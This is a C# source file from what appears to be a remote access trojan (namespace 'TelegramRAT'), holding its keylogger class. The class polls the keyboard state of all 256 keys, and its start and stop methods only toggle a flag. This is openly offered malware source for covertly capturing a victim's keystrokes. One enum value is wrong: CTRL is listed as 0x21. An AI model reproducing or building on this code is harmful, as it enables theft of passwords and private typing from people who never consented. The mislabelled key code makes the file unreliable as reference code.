using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace TelegramRAT
{
    static class Keylogger

    {
        public static bool IsLogging { get; private set; } = false;


        public static List<uint> GetPressingKeys()
        {
            List<uint> keys = new List<uint>();

            for (uint i = 0; i < 256; i++)
            {
                int state = WinAPI.GetAsyncKeyState(i);
                if (state != 0)
                {
                    keys.Add(i);
                }
            }

            return keys;
        }

        public static void StartLogging()
        {
            if (IsLogging)
                throw new Exception("Keylogger was already started!");
            IsLogging = true;

        }

        public static void StopLogging()
        {
            if (!IsLogging)
                throw new Exception("Keylogger wasn't started yet!");
            IsLogging = false;


        }

        enum VirtualKeyCodesTable
        {
            LBUTTON = 0x01,
            BACKSPACE = 0x08,
            TAB = 0x09,
            SHIFT = 0x10,
            CTRL = 0x21,
            CAPSLOCK = 0x14,
            ESC = 0x1B
        }
    }
}
